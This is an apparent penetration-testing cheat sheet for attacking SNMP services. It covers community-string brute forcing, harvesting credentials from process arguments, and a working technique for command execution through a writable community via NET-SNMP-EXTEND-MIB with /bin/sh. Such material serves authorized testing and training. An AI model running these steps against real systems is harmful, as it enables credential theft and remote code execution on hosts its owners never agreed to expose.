# SNMP

## Community + system info
v1/v2c community is plaintext.

```bash
onesixtyone -c <community-file> <IP>
snmpget -v2c -c public <IP> 1.3.6.1.2.1.1.1.0
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.1
```

## Targeted OIDs
```bash
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.4.2.1.2    # processes
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.4.2.1.5    # process ARGUMENTS - often has creds
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.6.3.1.2    # software
snmpwalk -v2c -c public <IP> 1.3.6.1.4.1.77.1.2.25     # Windows users
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.6.13.1.3      # TCP ports
```
- Unknown MIB name → use numeric OID.
- Timeout → filtering, wrong community or version.
- Full walk, then grep for leftover secrets in command lines: `snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.4.2.1 | grep -i pass`.

## Faster walk and classic tools
```bash
snmpbulkwalk -v2c -c public <IP> 1.3.6.1.2.1.1
snmp-check -c public <IP>
snmp-check -v 2c -c public <IP>
```
- `snmpbulkwalk` batches GETBULK requests instead of one GETNEXT per OID — faster over high-latency links than `snmpwalk`.
- `snmp-check` formats system/network/storage/process/user info into one report. Default is SNMP v1: add `-v 2c` when the agent only answers v2c.
- MIB names not resolving → `sudo apt install snmp-mibs-downloader` (pulls the IANA/IETF MIB files `snmpwalk`/`snmpget` use to turn numeric OIDs into names like `NET-SNMP-EXTEND-MIB::nsExtendObjects`).

## Community string brute force
```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt <IP>
```

## SNMPv3
No plaintext community; auth + optional encryption instead.
```bash
snmpwalk -v3 -l authPriv -u '<USER>' -a SHA -A '<AUTH-PASS>' -x AES -X '<PRIV-PASS>' <IP> 1.3.6.1.2.1.1
```
- `-l`: `noAuthNoPriv` / `authNoPriv` / `authPriv`. `-a`: `MD5`/`SHA`. `-x`: `DES`/`AES`.

## Write community → command execution
Only if the community in `-c` has write access (test with `snmpset` on a throwaway OID first).
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c <private-community> <IP> \
  'nsExtendStatus."pwn"' = createAndGo \
  'nsExtendCommand."pwn"' = /bin/sh \
  'nsExtendArgs."pwn"' = '-c "id"'
snmpwalk -v2c -c <private-community> <IP> NET-SNMP-EXTEND-MIB::nsExtendObjects
snmpget -v2c -c <private-community> <IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull.'"pwn"'
```
- The command's absolute path must exist and be executable on the target; `NET-SNMP-EXTEND-MIB` must be loaded by `snmpd` (default on most distro packages).
- Output is read-triggered: the `snmpget` on `nsExtendOutputFull` is what runs the command and returns its output.
